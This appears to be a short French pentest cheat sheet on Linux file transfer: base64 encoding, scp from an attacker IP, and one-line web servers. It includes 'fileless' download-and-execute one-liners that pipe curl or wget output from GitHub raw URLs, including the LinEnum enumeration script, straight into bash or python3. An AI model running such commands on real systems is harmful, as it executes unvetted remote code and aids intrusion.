# Linux

## Download / Upload

Récéption de fichier en base64:

```bash
cat $fichier | base64 -w 0;echo
```

```bash
echo -n '$base64' | base64 -d > $fichier
```

Télécharger un fichier et l'exécuter (fileless):

```bash
curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash

ou 

wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3
```

Récéption d'un fichier via SSH:

```bash
sudo systemctl start ssh
```

```bash
scp $user@$monIp:$fichier .
```

## Création de serveur temporaire

Serveur web python3:

```bash
python3 -m http.server
```

Serveur web python2.7:

```bash
python2.7 -m SimpleHTTPServer
```

Serveur web PHP:

```bash
php -S 0.0.0.0:8000
```

Serveur web Ruby:

```bash
ruby -run -ehttpd . -p8000
```
